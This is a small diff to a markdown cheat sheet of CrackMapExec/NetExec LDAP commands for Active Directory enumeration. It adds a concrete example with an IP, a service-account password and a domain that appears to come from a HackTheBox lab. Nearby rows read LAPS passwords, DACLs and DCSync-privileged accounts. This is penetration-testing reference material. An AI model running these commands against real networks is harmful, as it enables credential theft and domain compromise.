@@ -210,6 +210,7 @@
 | `cme [protocol] -M <module_name> --options` | Show module options. | 
 | `cme ldap  <target> -u <u> -p <p> -M get-network -o ALL=true` | Get DNS and IP information. |
 | `cme ldap  <target> -u <u> -p <p> -M laps` | Retrieve all computers an account has access to read. |
+| `nxc ldap 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb --module laps` | Retrieve all computers an account has access to read. |
 | `cme ldap  <target> -u <u> -p <p> -M maq` | Get the machine account quota for a user. |
 | `cme ldap  <target> -u <u> -p <p> -M daclread -o TARGET=<username> ACTION=<read>` | Read all ACEs of the target account. |
 | `cme ldap  <target> -u <u> -p <p> -M daclread -o TARGET_DN=<DN> ACTION=read RIGHTS=DCSync` | Read all objects with DCSync privileges. |
